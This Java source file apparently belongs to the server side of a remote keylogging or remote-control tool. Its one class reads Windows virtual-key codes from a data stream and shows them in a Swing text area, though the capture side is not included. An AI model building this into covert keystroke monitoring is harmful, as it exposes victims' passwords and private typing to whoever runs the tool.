package me.server.receive;

import com.sun.jna.platform.win32.Win32VK;

import javax.swing.*;
import java.awt.event.KeyEvent;
import java.io.DataInputStream;
import java.util.Date;

public class GetKey implements Runnable{
    DataInputStream dataInputStream;
    public boolean run = false;
    JTextArea jta;
    public GetKey(DataInputStream dataInputStream,JTextArea jta) {
        this.dataInputStream = dataInputStream;
        this.jta = jta;
    }

    @Override
    public void run() {
        try {
            jta.append(new Date() + "\n");
            while (run) {
                int key = dataInputStream.readInt();
                if(key !=200) {
                    String s = String.valueOf(Win32VK.fromValue(key));
                    jta.append(s.substring(3));
                }
            }
        }catch (Exception e) {
        }
    }
}
